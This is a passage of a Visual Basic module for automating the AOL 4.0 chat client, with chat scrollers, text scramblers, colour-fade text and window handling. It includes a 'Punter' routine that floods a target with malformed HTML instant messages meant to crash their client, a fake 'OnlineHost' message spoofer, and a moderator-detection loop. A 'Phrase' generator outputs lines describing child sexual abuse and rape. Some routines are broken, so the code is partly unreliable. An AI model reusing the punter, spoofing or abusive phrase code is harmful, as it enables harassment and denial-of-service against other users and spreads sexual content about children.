SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$
timeout 0.3
End Sub

Public Sub AOLTwentyFiveLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + ""
timeout 1.5

End Sub


Public Sub AOLTwentyLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
End Sub

Function Scrambletext(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Scrambles the text
For scrambling = 1 To Len(thetext)
DoEvents
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
Scrambletext = scrambled$

Exit Function
End Function
Function DescrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Descrambles the text
For scrambling = 1 To Len(thetext)
DoEvents
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo city
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
city:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
scrambled$ = scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = scrambled$

End Function


Sub Directory_Create(dir)
'This will add a directory to your system
'Example of what it should look like:
'Call Directory_Create("C:\My Folder\NewDir")
MkDir dir
End Sub

Sub Directory_Delete(dir)
'This deletes a directory automatically from your HD
RmDir (dir)
End Sub


Sub File_Delete(File)
'This will delete a file straight from the users HD
Kill (File)
End Sub
Sub File_Open(File)
'This will open a file... whole dir and file name needed
Shell (File)
End Sub
Sub File_ReName(sFromLoc As String, sToLoc As String)
'This will immediately rename a file for you
Name sOldLoc As sNewLoc
End Sub

Sub Window_Close(win)
'This will close and window of your choice
Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub

Sub Window_Hide(hWnd)
'This will hide the window of your choice
X = ShowWindow(hWnd, SW_HIDE)
End Sub



Sub Window_Show(hWnd)
'This will show the window of your choice
X = ShowWindow(hWnd, SW_SHOW)
End Sub

Sub AOL40_Load()
'This will load AOL4.0
X% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub

Sub PhreakyAttention(text)

SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
SendChat ("<B>" & text)
SendChat ("<I>" & text)
SendChat ("<U>" & text)
SendChat ("<S>" & text)
SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
End Sub

Sub Punter(text)
'this is a fun  punt string
' it is best to put it in a
'timer... Make sure u have a
'stop button or it will just keep goin
Dim Punt
Punt = "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
'that made it so I din't have
'to type as much shit below

Dim pu
pu = "<P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
Call IMKeyword(text, pu)
Call IMKeyword(text, Punt)

End Sub


Sub AOL4_Invite(Person)
'This will send an Invite to a person
'werks good for a pinter if u use a timer
FreeProcess
On Error GoTo errhandler
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
bud% = FindChildByTitle(mdi%, "Buddy List Window")
e = FindChildByClass(bud%, "_AOL_Icon")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
ClickIcon (e)
timeout (1#)
chat% = FindChildByTitle(mdi%, "Buddy Chat")
aoledit% = FindChildByClass(chat%, "_AOL_Edit")
If chat% Then GoTo FILL
FILL:
Call AOL4_SetText(aoledit%, Person)
de = FindChildByClass(chat%, "_AOL_Icon")
ClickIcon (de)
Killit% = FindChildByTitle(mdi%, "Invitation From:")
AOL4_KillWin (Killit%)
FreeProcess
errhandler:
Exit Sub
End Sub

Sub AOL4_SetText(win, Txt)
'This is usually used for an _AOL_Edit or RICHCNTL
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub

Sub AOL4_KillWin(Windo)
'Closes a window....ex: AOL4_Killwin (IM%)
CloseTheMofo = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub

Function Saying()
'This will generate a random saying
'werks good for an 8 ball bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--Hmm.....ask again Later"
Case 2: SendChat "<B>-=8=--Yeah baby!"
Case 3: SendChat "<B>-=8=--YES!"
Case 4: SendChat "<B>-=8=--NO!"
Case 5: SendChat "<B>-=8=--It looks to be in your favor!"
Case 6: SendChat "<B>-=8=--If you only knew! };-)"
Case 7: SendChat "<B>-=8=--GUESS WHAT! I don't care"
Case Else: SendChat "<B>-=8=--Sorry! Not this time."
End Select
End Function
Function Saying2()
'This will generate a random saying
'werks good for a drug bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--U get a big fat <(((((Joint))))))>"
Case 2: SendChat "<B>-=8=--U get  Acid"
Case 3: SendChat "<B>-=8=--U get a  -----(  Needle  )--|"
Case 4: SendChat "<B>-=8=-- U get shrooms"
Case 5: SendChat "<B>-=8=-- Hehe U overdosed"
Case 6: SendChat "<B>-=8=--U get pills () to pop"
Case 7: SendChat "<B>-=8=--Fugg u u are a nark and get nuttin"
Case Else: SendChat "<B>-=8=-- U get a big fat Crack roc"
End Select
End Function
Function BoldBlack_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function



Function BoldYellowPinkYellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(78, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function

Function BoldWhitePurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    WhitePurpleWhite (Msg)
End Function

Function BoldLBlue_Green_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Green_LBlue (Msg)
End Function

Function BoldLBlue_Yellow_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Yellow_LBlue (Msg)
End Function

Function BoldPurple_LBlue_Purple()
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldDBlue_Black_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 450 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function

Function BoldDGreen_Black(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function



Function BoldLBlue_Orange(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange (Msg)
End Function



Function BoldLBlue_Orange_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange_LBlue (Msg)
End Function

Function BoldLGreen_DGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 220 / A
        F = e * B
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen (Msg)
End Function

Function BoldLGreen_DGreen_LGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen_LGreen (Msg)
End Function

Function BoldLBlue_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldLBlue_DBlue_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPinkOrange(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 200 / A
        F = e * B
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function

Function BoldPinkOrangePink(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function

Function BoldPurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 200 / A
        F = e * B
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function

Function BoldPurpleWhitePurple(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldYellow_LBlue_Yellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function
Function Phrase() As String

Randomize Timer
Select Case Int(Rnd * 15)
    Case 0: Phrase$ = "I LIKE TO "
    Case 1: Phrase$ = "I LOVE TO "
    Case 2: Phrase$ = "IT MAKES ME HORNY WHEN I "
    Case 3: Phrase$ = "MY ASSHOLE GETS WET WHEN I "
    Case 4: Phrase$ = "IT GIVES ME ANAL PLEASURE TO "
    Case 5: Phrase$ = "IT MAKES ME CUM WHEN I "
    Case 6: Phrase$ = "I MOAN WHEN I "
    Case 7: Phrase$ = "I CUM INTO MY ASSHOLE WHEN I "
    Case 8: Phrase$ = "I LOVE THE FEELING I GET WHEN I "
    Case 9: Phrase$ = "MY ANAL ROLLS JIGGLE WHEN I "
    Case 10: Phrase$ = "I INSERT MY PINKY INTO THE TIP OF MY PENIS SO I CAN "
    Case 11: Phrase$ = "I POSE AS A PRIEST JUST SO I CAN "
    Case 12: Phrase$ = "IT MAKES ME CUM IN MY PANTIES WHEN I "
    Case 13: Phrase$ = "I STICK MY THUMB UP MY ASS WHEN I "
    Case 14: Phrase$ = "ALL PAIN DISSAPPEARS WHEN I "
End Select
Select Case Int(Rnd * 19)
    Case 0: Phrase$ = Phrase$ + "FONDLE LITTLE BOYS"
    Case 1: Phrase$ = Phrase$ + "TOUCH LITTLE GIRLS"
    Case 2: Phrase$ = Phrase$ + "FINGER FUCK MY ASSHOLE"
    Case 3: Phrase$ = Phrase$ + "ANALY RAPE CHICKENS"
    Case 4: Phrase$ = Phrase$ + "ASS FUCK NUNS"
    Case 5: Phrase$ = Phrase$ + "MOLEST PRE SCHOOLERS"
    Case 6: Phrase$ = Phrase$ + "STRETCH THE ASSHOLES OF KINDERGARTENERS"
    Case 7: Phrase$ = Phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK MY PENIS"
    Case 8: Phrase$ = Phrase$ + "LOOK AT OTHER MEN"
    Case 9: Phrase$ = Phrase$ + "TOUCH OTHER MENS PENIS'S AND THEN STROKE THEIR SHAFTS"
    Case 10: Phrase$ = Phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: Phrase$ = Phrase$ + "FINGER MY MOTHERS CUNT"
    Case 12: Phrase$ = Phrase$ + "STRANGLE LITTLE BOYS THEN RAPE THEIR DEAD BODIES"
    Case 13: Phrase$ = Phrase$ + "GET INTO THE PANTS OF A 7 YEAR OLD GIRL"
    Case 14: Phrase$ = Phrase$ + "MOLEST STATUES OF GREAT AMERICAN HEROES"
    Case 15: Phrase$ = Phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: Phrase$ = Phrase$ + "SHOVE A BROOM STICK UP MY PET DOGS ASSHOLE"
    Case 17: Phrase$ = Phrase$ + "GO TO A PLAYGROUND AND MOLEST THE CHILDREN"
    Case 18: Phrase$ = Phrase$ + "BREAK IN A 5 YEAR OLDS PUSSY"
End Select
SickPhrase = Phrase$
End Function
Sub falling_form(frm As Form, steps As Integer)
'this is a pretty neat sub try
'it out and see what it does
On Error Resume Next
BgColor = frm.BackColor
frm.BackColor = RGB(0, 0, 0)
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = False
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / steps
Y = ((Screen.Height - frm.Height) - frm.Top) / steps
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub
Function AOLMDI()
aol% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(aol%, "MDIClient")
End Function
Sub AOLSetText(win, Txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Sub AOLAntiPunter()
'this is not the best anti there is use this
'at your own risk it is pretty buggy
Do
ANT% = FindChildByTitle(AOLMDI(), "Untitled")
IMRICH% = FindChildByClass(ANT%, "RICHCNTL")
STS% = FindChildByClass(ANT%, "_AOL_Static")
ST% = GetWindow(STS%, GW_HWNDNEXT)
ST% = GetWindow(ST%, GW_HWNDNEXT)
Call AOLSetText(ST%, "Ritual2x¹ - This IM Window Should Remain OPEN.")
mi = ShowWindow(ANT%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
End If
Loop
End Sub
Sub AOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_RESTORE)
Call AOL4_SetFocus
End Sub
Public Sub AOLKillWindow(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub
Sub AOLBuddyBLOCK(SN As TextBox)
BUDLIST% = FindChildByTitle(AOLMDI(), "Buddy List Window")
Locat% = FindChildByClass(BUDLIST%, "_AOL_ICON")
IM1% = GetWindow(Locat%, GW_HWNDNEXT)
setup% = GetWindow(IM1%, GW_HWNDNEXT)
ClickIcon (setup%)
timeout (2)
STUPSCRN% = FindChildByTitle(AOLMDI(), AOLGetUser & "'s Buddy Lists")
Creat% = FindChildByClass(STUPSCRN%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Delete% = GetWindow(Edit%, GW_HWNDNEXT)
View% = GetWindow(Delete%, GW_HWNDNEXT)
PRCYPREF% = GetWindow(View%, GW_HWNDNEXT)
ClickIcon PRCYPREF%
timeout (1.8)
Call AOLKillWindow(STUPSCRN%)
timeout (2)
PRYVCY% = FindChildByTitle(AOLMDI(), "Privacy Preferences")
DABUT% = FindChildByTitle(PRYVCY%, "Block only those people whose screen names I list")
AOLButton (DABUT%)
DaPERSON% = FindChildByClass(PRYVCY%, "_AOL_EDIT")
Call AOLSetText(DaPERSON%, SN)
Creat% = FindChildByClass(PRYVCY%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
ClickIcon Edit%
timeout (1)
Save% = GetWindow(Edit%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
ClickIcon Save%
End Sub
Function AOLActivate()
X = GetCaption(AOLWindow)
AppActivate X
End Function
Function AOLWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = aol%
End Function
Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function


Function FindSendWin(dosloop)
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function
Function FindForwardWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = FindChildByTitle(childfocus%, "Send Now")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindForwardWindow = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function

Function Mail_ClickForward()
X = FindOpenMail
If X = 0 Then GoTo last
AOLActivate
SendKeys "{TAB}"
AG:
timeout (0.2)
SendKeys " "
X = FindSendWin(2)
If X = 0 Then GoTo AG
last:
End Function
Function AOLFindRoom()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "_AOL_Edit")
listere% = FindChildByClass(childfocus%, "_AOL_View")
listerb% = FindChildByClass(childfocus%, "_AOL_Listbox")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then AOLFindRoom = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function
Sub AOLHostManipulator(What$)
'a good sub but kinda old style
'Example.... AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
View% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "OnlineHost:" & Chr$(9) & "" & (What$) & ""
X% = SendMessageByString(View%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub AOLGuideWatch()
'a good sub but kinda old style
Do
    Y = DoEvents()
For Index% = 0 To 25
NameZ$ = String$(256, " ")
If Len(Trim$(NameZ$)) <= 1 Then GoTo end_ad
NameZ$ = Left$(Trim$(NameZ$), Len(Trim(NameZ$)) - 1)
X = InStr(LCase$(NameZ$), LCase$("guide"))
If X <> 0 Then
Call keyword("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub
Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(AOLWindow(), stringer)
End Sub
Function AOLCountMail()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
timeout (7)
End If

mailwin = FindChildByTitle(AOLMDI, "New Mail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo last
Mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   namelen = SendMessage(Mailtree, LB_GETTEXTLEN, Counter, 0)
    buffer$ = String$(namelen, 0)
    X = SendMessageByString(Mailtree, LB_GETTEXT, Counter, buffer$)
    TabPos = InStr(buffer$, Chr$(9))
    buffer$ = Right$(buffer$, (Len(buffer$) - (TabPos)))
    Box.AddItem buffer$
 timeout (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_CloseMail()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
End Function

